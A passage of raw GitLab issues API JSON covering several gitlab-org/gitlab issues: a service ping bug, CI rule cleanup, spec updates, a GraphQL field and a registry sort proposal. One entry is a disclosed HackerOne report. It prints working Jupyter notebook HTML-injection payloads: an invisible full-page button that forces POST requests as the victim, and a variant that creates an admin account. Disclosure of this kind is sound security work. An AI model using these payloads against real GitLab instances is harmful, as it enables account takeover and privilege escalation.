in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n\n\n### Summary\n\nWith https://gitlab.com/gitlab-org/gitlab/-/merge_requests/72083 `license_scanning_jobs` and `license_management_jobs` metrics were refactored to use instrumentation class. During refactor removing `license_scanning_jobs` out of payload was left in responsibility of `ServicePing::BuildPayloadService`. However payload filtering based on metric definition is only executed when there is active license present for EE instance (see https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/services/ee/service_ping/build_payload_service.rb#L10) as a result EE self managed instance started to report both `license_scanning_jobs` and `license_management_jobs` instead of only `license_management_jobs`\n\n### Steps to reproduce\n\n```pry\n#in rails console\n\n# 1 stub License.current method\nclass License\n  def self.current\n    nil\n  end\nend\n\n# 2 collect payload\n\npayload = ServicePing::BuildPayloadService.new.execute\n\n# 3 check that unwanted key is present\n\npayload[:counts].key? :license_scanning_jobs\n```\n\n### Example Project\n\n\u003c!-- If possible, please create an example project here on GitLab.com that exhibits the problematic \nbehavior, and link to it here in the bug report. If you are using an older version of GitLab, this \nwill also determine whether the bug is fixed in a more recent version. --\u003e\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2021-12-07T13:15:30.846Z","updated_at":"2022-02-03T15:14:51.112Z","closed_at":"2022-01-18T16:04:18.776Z","closed_by":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"labels":["backend","devops::growth","group::product intelligence","needs weight","priority::2","section::growth","severity::2","type::bug","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"}],"author":{"id":4807002,"username":"mikolaj_wawrzyniak","name":"Mikoaj Wawrzyniak","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4807002/avatar.png","web_url":"https://gitlab.com/mikolaj_wawrzyniak"},"type":"ISSUE","assignee":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347309","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347309","notes":"https://gitlab.com/api/v4/projects/278964/issues/347309/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347309/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347309","relative":"#347309","full":"gitlab-org/gitlab#347309"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98602968,"iid":347306,"project_id":278964,"title":"Reduce duplication of rules in `.gitlab/ci/rules.gitlab-ci.yml`","description":"We currently have a lot of duplicated rules in https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/ci/rules.gitlab-ci.yml, for instance:\n\n```yaml\n    - \u003c\u003c: *if-not-ee\n      when: never\n    - \u003c\u003c: *if-jh\n      when: never\n```\n\nWe should look into reducing this duplication, probably by using `!reference`.","state":"closed","created_at":"2021-12-07T12:59:26.381Z","updated_at":"2022-03-16T11:29:05.299Z","closed_at":"2022-02-14T17:36:49.931Z","closed_by":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Engineering Productivity","maintenance::pipelines","priority::3","type::maintenance","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"Rmy Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347306","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347306","notes":"https://gitlab.com/api/v4/projects/278964/issues/347306/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347306/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347306","relative":"#347306","full":"gitlab-org/gitlab#347306"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98601978,"iid":347302,"project_id":278964,"title":"Update compliance report feature specs","description":"As we have replaced the existing compliance report application with the new violations version, we need to update the feature specs before we remove the feature flag entirely. The feature should be tested with and without the feature flag in `ee/spec/features/groups/security/compliance_dashboards_spec.rb`","state":"closed","created_at":"2021-12-07T12:41:31.707Z","updated_at":"2022-03-17T10:54:14.070Z","closed_at":"2022-03-17T10:54:14.038Z","closed_by":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"labels":["Category:Compliance Management","Enterprise Edition","GitLab Ultimate","backend","devops::manage","feature flag","frontend","group::compliance","priority::3","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"}],"author":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"type":"ISSUE","assignee":{"id":3468028,"username":"jiaan","name":"Jiaan Louw","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3468028/avatar.png","web_url":"https://gitlab.com/jiaan"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347302","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347302","notes":"https://gitlab.com/api/v4/projects/278964/issues/347302/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347302/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347302","relative":"#347302","full":"gitlab-org/gitlab#347302"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6870,"epic":{"id":364935,"iid":6870,"title":"Compliance report merge request violations frontend MVP","url":"/groups/gitlab-org/-/epics/6870","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"at_risk"},{"id":98581626,"iid":347292,"project_id":278964,"title":"Add descriptionHtml field to Vulnerability GraphQL API","description":"Epic: https://gitlab.com/groups/gitlab-org/-/epics/7158\n\n### Proposal\n\nThis is to expose a new field `description_html` to `VulnerabilityType` to support markdown content for Vulnerability Description.\n\n### Implementation Plan\n\n- [x] `description` is already a [cache markdown field](https://gitlab.com/gitlab-org/gitlab/blob/cdf8361699a8edc1109ef9a89d0e211763637b0b/ee/app/models/ee/vulnerability.rb#L26\n)\n- [x] expose `descriptionHtml` field in `ee/app/graphql/types/vulnerability_type.rb`\n- [x] add specs in `ee/spec/graphql/types/vulnerability_type_spec.rb`\n\n### More details\n**Description**\n\nThe GitLab Flavored Markdown rendering of `description` field\n\n**Example**\n\n```graphql\nquery{ \n  vulnerability(id: \"gid://gitlab/Vulnerability/49\") {\n    id\n    title\n    description\n    descriptionHtml\n  }\n}\n```","state":"closed","created_at":"2021-12-07T09:11:46.990Z","updated_at":"2021-12-20T03:21:37.608Z","closed_at":"2021-12-14T03:51:31.369Z","closed_by":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"labels":["GraphQL","backend","feature::addition","section::sec","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"}],"author":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"type":"ISSUE","assignee":{"id":4019091,"username":"djadmin","name":"Dheeraj Joshi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/57dccb416bfcfac947a69c53c5585128?s=80\u0026d=identicon","web_url":"https://gitlab.com/djadmin"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347292","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347292","notes":"https://gitlab.com/api/v4/projects/278964/issues/347292/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347292/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347292","relative":"#347292","full":"gitlab-org/gitlab#347292"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7158,"epic":{"id":389384,"iid":7158,"title":"Allow markdown in vulnerability description field","url":"/groups/gitlab-org/-/epics/7158","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98567311,"iid":347285,"project_id":278964,"title":"Sort package registry by \"Published\" by default","description":"### Problem \n![Screen_Shot_2021-12-07_at_18.10.18](/uploads/f2a4890000ef7a405718d7800ff6526a/Screen_Shot_2021-12-07_at_18.10.18.png)\n\nBy default the sort of the Package Registry is by name. [Screen recording](https://share.getcloudapp.com/12uP2BdW) of default sort.\n\nWe know from past [research](https://gitlab.com/gitlab-org/uxr_insights/-/issues/700) that customers are visiting the registry to check that the package published, check which package to use, or troubleshoot. For all use cases, having packages that are active at the top of the list is the most helpful. \n\n### Proposal\n\nThe most helpful sort attribute is `Published` as it's most likely to result in active packages being at the top of the list. In addition, if someone has used the registry UI before, they likely have already used their preferred sorting method. So, the default sort should:\n\n- If the user has never navigated to the package registry, sort by published, descending, by default. \n- If the user has navigated to the package registry, sort by last choice user sorted by. (Note this will only work if the user is using the same browser)","state":"closed","created_at":"2021-12-07T05:12:04.814Z","updated_at":"2022-02-16T10:57:19.132Z","closed_at":"2022-01-31T10:31:35.696Z","closed_by":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"labels":["Category:Package Registry","Package:P1","SUS::Impacting","UI polish","UX","devops::package","feature::enhancement","frontend","frontend-weight::2","group::package registry","section::ops","severity::4","type::feature","workflow::in review"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"}],"author":{"id":9608331,"username":"katiemacoy","name":"Katie Macoy","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9608331/avatar.png","web_url":"https://gitlab.com/katiemacoy"},"type":"ISSUE","assignee":{"id":4584738,"username":"nmezzopera","name":"Nicol Maria Mezzopera","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4584738/avatar.png","web_url":"https://gitlab.com/nmezzopera"},"user_notes_count":6,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347285","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347285","notes":"https://gitlab.com/api/v4/projects/278964/issues/347285/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347285/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347285","relative":"#347285","full":"gitlab-org/gitlab#347285"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98560957,"iid":347284,"project_id":278964,"title":"Arbitrary POST request as victim user from HTML injection in Jupyter notebooks","description":"**[HackerOne report #1409788](https://hackerone.com/reports/1409788)** by `joaxcar` on 2021-11-24, assigned to @dcouture:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\n#####  Summary  \nAn attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user. In the \"worst case\" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.\n\nThis research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.\n\nThe script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.\n\n```  \nfunction deferredInitialisation() {  \n  const $body = $('body');\n\n  initTopNav();  \n  initBreadcrumbs();  \n  initTodoToggle();  \n  initLogoAnimation();  \n  initServicePingConsent();  \n  initUserPopovers();  \n  initBroadcastNotifications();  \n  initPersistentUserCallouts();  \n  initDefaultTrackers();  \n  initFeatureHighlight();  \n```\n\nReading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.\n\nAs an example we have persistent_user_callout in\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js\n\nwhere a POST request is made like\n\n```  \ndismiss(event, deferredLinkOptions = null) {  \n    event.preventDefault();\n\n    axios  \n      .post(this.dismissEndpoint, {  \n        feature_name: this.featureId,  \n      })  \n```\n\nthe `dissmissEndpoint` is controllable through a data attribute `data-dissmiss-endpoint`. The data attributes are extracted like so\n\n```  \nexport default class PersistentUserCallout {  \n  constructor(container, options = container.dataset) {  \n    const { dismissEndpoint, featureId, deferLinks } = options;  \n    this.container = container;  \n    this.dismissEndpoint = dismissEndpoint;  \n    this.featureId = featureId;  \n    this.deferLinks = parseBoolean(deferLinks);\n\n    this.init();  \n  }  \n```\n\nTo be able to fire the dismiss function (and thus the POST request) we also need a `js-close` button\n\n```  \nconst closeButton = this.container.querySelector('.js-close');  \n```\n\nThe HTML needed to set this up is\n\n```  \n\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e  \n    \u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003e  \n        hack  \n    \u003c/button\u003e  \n\u003c/div\u003e  \n```\n\nThe styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.\n\nNow to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.\n\nA file like this will do as a simple POC\n\n```  \n{\n  \"cells\": [  \n    {  \n      \"metadata\": { \"trusted\": true },  \n      \"cell_type\": \"code\",  \n      \"source\": \"\u003ch1\u003easd\u003c/h1\u003e\",  \n      \"execution_count\": 1,  \n      \"outputs\": [  \n        {  \n          \"output_type\": \"display_data\",  \n          \"data\": {  \n            \"text/plain\": \"\u003cIPython.core.display.HTML object\u003e\",  \n            \"text/html\": \"\u003cdiv class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\"\u003easdf\u003c/div\u003e\\n\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e\u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003ehack\u003c/button\u003e\u003c/div\u003e\\n\"  \n          },  \n          \"metadata\": {}  \n        }  \n      ]  \n    }  \n  ],  \n  \"metadata\": {  \n    \"kernelspec\": {  \n      \"name\": \"python3\",  \n      \"display_name\": \"Python 3\",  \n      \"language\": \"python\"  \n    },  \n    \"language_info\": {  \n      \"name\": \"python\",  \n      \"version\": \"3.7.8\",  \n      \"mimetype\": \"text/x-python\",  \n      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },  \n      \"pygments_lexer\": \"ipython3\",  \n      \"nbconvert_exporter\": \"python\",  \n      \"file_extension\": \".py\"  \n    }  \n  },  \n  \"nbformat\": 4,  \n  \"nbformat_minor\": 4  \n}\n```\n\nI have added a `feature-highlight` (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload \"load up\" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.\n\n![dot.png](https://h1.sec.gitlab.net/a/ab401856-12df-4c47-ae6c-4cbbecbbea89/dot.png)\n\nVisiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one\n\n```  \n\"text/html\": \"\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/users?admin=true\u0026email=joaxcarte01@wearehackerone.com\u0026name=just\u0026username=just\u0026password=asdasdasdasd\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e\u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003e.\u003c/button\u003e\u003c/div\u003e\\n\"}  \n```\n\nA visit by an admin to this site would end up with a new admin account being created.\n\nFinally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.\n\n#####  Steps to reproduce  \n1. Create a project on GitLab.com  \n2. Create a new file named `hack.ipynb` (or upload the included file) with the content  \n![hack.ipynb](https://h1.sec.gitlab.net/a/9bafbc43-addf-4850-a5e4-22e8562afaf2/hack.ipynb)  \n```  \n{\n  \"cells\": [  \n    {  \n      \"metadata\": { \"trusted\": true },  \n      \"cell_type\": \"code\",  \n      \"source\": \"\u003ch1\u003easd\u003c/h1\u003e\",  \n      \"execution_count\": 1,  \n      \"outputs\": [  \n        {  \n          \"output_type\": \"display_data\",  \n          \"data\": {  \n            \"text/plain\": \"\u003cIPython.core.display.HTML object\u003e\",  \n            \"text/html\": \"\u003cdiv class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\"\u003easdf\u003c/div\u003e\\n\u003cdiv class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"\u003e\u003cbutton style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\"\u003ehack\u003c/button\u003e\u003c/div\u003e\\n\"  \n          },  \n          \"metadata\": {}  \n        }  \n      ]  \n    }  \n  ],  \n  \"metadata\": {  \n    \"kernelspec\": {  \n      \"name\": \"python3\",  \n      \"display_name\": \"Python 3\",  \n      \"language\": \"python\"  \n    },  \n    \"language_info\": {  \n      \"name\": \"python\",  \n      \"version\": \"3.7.8\",  \n      \"mimetype\": \"text/x-python\",  \n      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },  \n      \"pygments_lexer\": \"ipython3\",  \n      \"nbconvert_exporter\": \"python\",  \n      \"file_extension\": \".py\"  \n    }  \n  },  \n  \"nbformat\": 4,  \n  \"nbformat_minor\": 4  \n}\n```  \n3. Click save  \n4. After saving you will land on the preview page for the file. If the out block does not contain a blue dot, refresh this page.  \n5. When the dot is blue click anywhere on the page  \n6. Now go to https://gitlab.com/dashboard/todos and check that a todo have been added\n\nvideo example of the POC (note the todo being empty and the blue dot):\n\n_REDACTED, see original H1 report_\n\n#####  Impact\n\nAn attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.\n\n#####  Examples\n\nPrivate project:  \nhttps://gitlab.com/parent02/sub2/asd/-/blob/main/hack.ipynb\n\n#####  What is the current *bug* behavior?\n\nDOMPurify does not filter out arbitrary data-* attributes, making it possible to high jack Gitlab UI JavaScript to make POST requests\n\n#####  What is the expected *correct* behavior?\n\nThe attributes should not work in Jupyter notebooks\n\n#####  Output of checks\n\nThis bug happens on GitLab.com\n\n####  Impact\n\nAn attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* todohack.webm - _REDACTED, see original H1 report_\n* [hack.ipynb](https://h1.sec.gitlab.net/a/9bafbc43-addf-4850-a5e4-22e8562afaf2/hack.ipynb)\n* [dot.png](https://h1.sec.gitlab.net/a/ab401856-12df-4c47-ae6c-4cbbecbbea89/dot.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues","state":"closed","created_at":"2021-12-07T00:57:12.927Z","updated_at":"2022-08-02T16:33:20.504Z","closed_at":"2022-02-04T02:45:14.207Z","closed_by":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"labels":["Category:Source Code Management","Deliverable","Engineering Allocation","HackerOne","Weakness::CWE-99","bug::vulnerability","devops::create","frontend","group::source code","priority::2","section::dev","security","severity::2","type::bug"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":2819375,"username":"jerasmus","name":"Jacques Erasmus","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2819375/avatar.png","web_url":"https://gitlab.com/jerasmus"},"user_notes_count":34,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":"2022-01-26","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347284","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347284","notes":"https://gitlab.com/api/v4/projects/278964/issues/347284/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347284/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347284","relative":"#347284","full":"gitlab-org/gitlab#347284"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98559752,"iid":347276,"project_id":278